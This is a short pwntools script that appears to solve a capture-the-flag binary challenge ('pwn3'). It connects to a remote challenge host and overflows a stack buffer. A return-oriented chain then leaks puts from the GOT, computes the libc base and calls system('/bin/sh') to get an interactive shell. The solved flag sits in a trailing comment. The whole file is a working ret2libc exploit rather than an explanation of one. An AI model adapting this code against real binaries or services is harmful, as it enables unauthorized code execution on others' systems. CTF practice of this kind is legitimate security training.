from pwn import *
context.log_level = 'debug'

e = context.binary = ELF('./pwn3')
# r= e.process()

r = remote('challs.n00bzunit3d.xyz', 42450)

lib = e.libc #   matches my libc

#   lib= ELF('libc6_2.36-0ubuntu4_amd64.so')
main= 0x00000000004011db
puts_plt =0x401060
puts_got = 0x404018
pop_rdi_ret = 0x0000000000401232
ret =0x000000000040101a

payload = b"a"*32+b"b"*8+ flat( pop_rdi_ret, puts_got, puts_plt, main)
pause()
r.sendlineafter(b"flag?\n", payload)
r.recvline()

puts_libc = u64(r.recv(6).ljust(8,b"\x00")) 
log.info("puts_libc: %#x" %puts_libc)
base_libc = puts_libc - lib.sym.puts
system_libc = base_libc + lib.sym.system
binsh_libc = base_libc + next(lib.search(b"/bin/sh"))
log.info("base_libc: %#x" %base_libc)
log.info("binsh_libc: %#x" %binsh_libc)

payload = b"a"*32+b"b"*8
payload+= flat(ret, pop_rdi_ret, binsh_libc, system_libc, ret)
pause()
r.sendline(payload)
# r.sendline(b"cat flag.txt")
r.interactive()
# n00bz{1f_y0u_h4ve_n0th1ng_y0u_h4ve_l1bc}